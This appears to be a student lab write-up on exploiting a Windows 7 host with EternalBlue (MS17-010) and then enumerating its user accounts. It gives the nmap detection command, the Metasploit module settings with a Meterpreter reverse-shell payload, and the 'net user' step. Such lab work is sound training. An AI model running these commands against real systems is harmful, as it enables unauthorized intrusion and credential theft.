# Milestone 3: Windows Password Attacks via EternalBlue Exploitation

## 1. Overview
This milestone focuses on exploiting a Windows 7 machine using the EternalBlue vulnerability (MS17-010), followed by credential harvesting, online and offline password cracking, and post-exploitation validation using SMB and RPC services. This exercise simulates realistic attack vectors and highlights the risks associated with weak password policies and credential reuse.

## 2. Environment Setup and Tools

- **Target:** Windows 7 SP1 (vulnerable to MS17-010)
- **Attacker:** Kali Linux (2023.4)
- **Tools Used:**
  - Metasploit Framework
  - Hydra
  - John the Ripper
  - rpcclient / smbclient
  - nano, cat (for wordlists)

---
## 3. Exploitation and Credential Discovery

### 3.1 Exploitation of MS17-010 (EternalBlue)

**Objective:** Gain remote code execution by exploiting a vulnerable SMB service on the Windows 7 target.

**Steps Taken:**
1. Scanned the target to confirm port 445 is open:
   ```bash
   nmap -p 445 --script smb-vuln-ms17-010 192.168.57.20
   ```
   - `-p 445` specifies the SMB port.
   - `--script smb-vuln-ms17-010` runs the NSE script to detect MS17-010 vulnerability.

2. Launched Metasploit and configured the EternalBlue module:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST 192.168.57.20
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.57.10
   exploit
   ```
   - `RHOST`: Target IP address
   - `LHOST`: Attacker IP address
   - `PAYLOAD`: Specifies the type of reverse shell

**Results:**
- The target was confirmed as vulnerable to MS17-010.
- The exploit succeeded, and a Meterpreter session was opened with SYSTEM-level access.

**Figure 1:** Meterpreter session established post-exploitation.

---
## 3.2 User Enumeration

**Objective:** Identify valid user accounts on the compromised host for further password attacks.

**Steps Taken:**
1. In Meterpreter:
   ```bash
   shell
   net user
   ```
2. Identified local users: Administrator, student, Guest.

**Results:**
- Enumerated users confirmed valid accounts that could be targeted for password attacks.

**Figure 2:** User enumeration output from `net user`.
